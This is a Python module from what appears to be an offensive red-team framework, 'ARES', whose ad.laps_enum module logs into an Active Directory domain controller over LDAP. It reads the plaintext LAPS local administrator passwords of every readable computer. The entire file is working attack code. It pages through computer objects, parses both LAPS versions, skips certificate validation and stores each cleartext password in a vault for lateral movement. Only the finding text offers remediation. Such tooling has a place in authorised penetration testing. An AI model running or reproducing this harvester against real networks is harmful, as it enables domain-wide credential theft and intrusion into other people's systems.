"""
LAPS Password Enumeration — ad.laps_enum
MITRE: T1552.004 — Credentials from Password Stores: Private Keys / LAPS Passwords

Reads plaintext local admin passwords from Active Directory.
LAPS (Local Administrator Password Solution) stores the password in
ms-Mcs-AdmPwd (LAPS v1) or msLAPS-Password (LAPS v2) on computer objects.

Only accounts with AllExtendedRights or ReadProperty on ms-Mcs-AdmPwd
can read these — ad.enum_acl identifies which accounts have this access.

OPSEC: LOW — single LDAP query, same noise level as ad.enum_users.
       Passwords stored directly in vault for immediate use.

Quick win: very common in enterprise environments, effort is minimal,
returns cleartext local admin passwords per host.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.ad.laps_enum")


class LAPSEnumModule(BaseModule):
    """
    ad.laps_enum — Read LAPS local admin passwords from Active Directory computer objects. Supports LAPS v1 (ms-Mcs

    OPSEC: LOW
    MITRE: "T1552.004"
    OUTPUTS:  "laps_passwords", "valid_credentials"
    """
    MODULE_ID          = "ad.laps_enum"
    MODULE_NAME        = "LAPS Password Enumeration"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Read LAPS local admin passwords from Active Directory computer objects. "
        "Supports LAPS v1 (ms-Mcs-AdmPwd) and LAPS v2 (msLAPS-Password). "
        "Passwords stored to vault for immediate lateral movement."
    )
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = []
    OUTPUTS            = ["laps_passwords", "valid_credentials"]
    MITRE_TECHNIQUES   = ["T1552.004"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_TIMEOUT_SECONDS: int | None = 60  # seconds

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.laps_enum requires 'dc' (Domain Controller IP or hostname).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.laps_enum requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.laps_enum requires domain credentials with ReadProperty "
                "on ms-Mcs-AdmPwd (identified by ad.enum_acl).",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            vault=getattr(ctx, "vault", None),
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.laps_enum")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  vault: "Any" = None, **kwargs: Any):
        dc       = sanitize_hostname(dc)
        username = sanitize_ldap(username)
        domain   = sanitize_ldap(domain)

        await self.before_request(dc, "ldap")
        logger.info("laps_enum_start", dc=dc, domain=domain)
        audit("laps_enum", actor=username, technique="T1552.004",
              source="operator", target=dc)

        loop = asyncio.get_running_loop()
        try:
            laps_entries = await loop.run_in_executor(
                None,
                lambda: self._query_laps_sync(dc, username, password, domain),
            )
        except Exception as exc:
            from ares.core.errors import NetworkError
            raise NetworkError(f"LAPS LDAP query failed: {exc}") from exc

        logger.info("laps_enum_done", found=len(laps_entries))

        if laps_entries:
            # Store every LAPS password to vault so lateral modules can use them
            _vault = vault or getattr(getattr(self, "campaign", None), "_vault", None)
            if _vault:
                from ares.credential.vault import Credential, CredentialType, PrivilegeLevel
                stored = 0
                campaign_id = getattr(getattr(self, "campaign", None), "id", "")
                for entry in laps_entries:
                    try:
                        cred = Credential(
                            campaign_id    = campaign_id,
                            username       = "Administrator",
                            domain         = entry["computer"],   # host-scoped
                            cred_type      = CredentialType.CLEARTEXT,
                            privilege      = PrivilegeLevel.LOCAL_ADMIN,
                            source_module  = self.MODULE_ID,
                            target_host    = entry["computer"],
                        )
                        _vault.store(cred, entry["password"])
                        stored += 1
                    except Exception as exc:
                        logger.debug("laps_vault_store_failed",
                                     computer=entry["computer"], error=str(exc)[:60])
                logger.info("laps_stored_to_vault", count=stored)

            self.finding(
                title       = f"LAPS Passwords Readable: {len(laps_entries)} Host(s)",
                description = (
                    f"Read LAPS local admin passwords for {len(laps_entries)} computer(s). "
                    "These are plaintext local Administrator passwords stored by LAPS. "
                    "All passwords stored to vault for lateral movement."
                ),
                severity    = Severity.CRITICAL,
                mitre_technique = "T1552.004",
                mitre_tactic    = "Credential Access",
                evidence = {
                    "host_count":  len(laps_entries),
                    "computers":   [e["computer"] for e in laps_entries[:20]],
                    "laps_version": list({e["version"] for e in laps_entries}),
                    "note": "Plaintext passwords in vault — not shown in findings",
                },
                remediation = (
                    "Restrict ReadProperty on ms-Mcs-AdmPwd to only authorized admins. "
                    "Audit LAPS ACL via ad.enum_acl. "
                    "Rotate LAPS passwords immediately on all affected hosts. "
                    "Consider LAPS v2 (msLAPS) with improved ACL model."
                ),
            )

        raw = {
            "found":   len(laps_entries),
            "entries": [{"computer": e["computer"], "expiry": e.get("expiry", ""),
                          "version": e["version"]}
                        for e in laps_entries],   # passwords omitted from raw
        }
        await self.noise.jitter.sleep()
        raw["laps_passwords"] = raw.get("entries", [])  # OUTPUTS key
        raw["valid_credentials"] = raw.get("found", 0)  # OUTPUTS key
        return self._findings[:], raw

    def _query_laps_sync(self, dc: str, username: str, password: str,
                          domain: str) -> list[dict]:
        """
        LDAP query for LAPS passwords on computer objects.
        Tries LAPS v1 (ms-Mcs-AdmPwd) then LAPS v2 (msLAPS-Password).
        Returns list of {computer, password, version, expiry}.
        Sync — runs in executor.
        """
        import ssl
        import ldap3
        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
        from ldap3.core.exceptions import LDAPBindError

        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl, tls=tls_arg,
                                 get_info=ALL, connect_timeout=10)
                conn = Connection(server, user=f"{domain.upper()}\\{username}",
                                  password=password, authentication=NTLM,
                                  auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=30)
                if not conn.bind():
                    conn = None
                else:
                    break
            except Exception:
                conn = None

        if conn is None:
            raise ConnectionError(f"Cannot bind to {dc}")

        base    = ",".join(f"DC={p}" for p in domain.upper().split("."))
        entries: list[dict] = []

        try:
            # LAPS v1: ms-Mcs-AdmPwd attribute
            cookie: bytes | bool = True
            while cookie:
                conn.search(
                    base,
                    "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))",
                    search_scope=SUBTREE,
                    paged_size=200,
                    paged_cookie=None if cookie is True else cookie,
                    attributes=["sAMAccountName", "ms-Mcs-AdmPwd",
                                "ms-Mcs-AdmPwdExpirationTime"],
                )
                for e in conn.entries:
                    pwd = ""
                    try:
                        pwd_attr = getattr(e, "ms-Mcs-AdmPwd", None)
                        if pwd_attr and pwd_attr.value:
                            pwd = str(pwd_attr.value)
                    except Exception:
                        pass
                    if not pwd:
                        continue
                    expiry = ""
                    try:
                        exp_attr = getattr(e, "ms-Mcs-AdmPwdExpirationTime", None)
                        if exp_attr and exp_attr.value:
                            expiry = str(exp_attr.value)
                    except Exception:
                        pass
                    entries.append({
                        "computer":  str(e.sAMAccountName).rstrip("$"),
                        "password":  pwd,
                        "expiry":    expiry,
                        "version":   "v1",
                    })
                cookie = (
                    conn.result.get("controls", {})
                        .get("1.2.840.113556.1.4.319", {})
                        .get("value", {})
                        .get("cookie")
                )

            # LAPS v2: msLAPS-Password attribute
            cookie = True
            while cookie:
                conn.search(
                    base,
                    "(&(objectCategory=computer)(msLAPS-Password=*))",
                    search_scope=SUBTREE,
                    paged_size=200,
                    paged_cookie=None if cookie is True else cookie,
                    attributes=["sAMAccountName", "msLAPS-Password",
                                "msLAPS-PasswordExpirationTime"],
                )
                for e in conn.entries:
                    pwd = ""
                    try:
                        pwd_attr = getattr(e, "msLAPS-Password", None)
                        if pwd_attr and pwd_attr.value:
                            import json
                            # LAPS v2 stores JSON: {"n":"Administrator","t":"...","p":"password"}
                            blob = str(pwd_attr.value)
                            data = json.loads(blob)
                            pwd  = data.get("p", blob)
                    except Exception:
                        pass
                    if not pwd:
                        continue
                    entries.append({
                        "computer": str(e.sAMAccountName).rstrip("$"),
                        "password": pwd,
                        "version":  "v2",
                    })
                cookie = (
                    conn.result.get("controls", {})
                        .get("1.2.840.113556.1.4.319", {})
                        .get("value", {})
                        .get("cookie")
                )

        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return entries
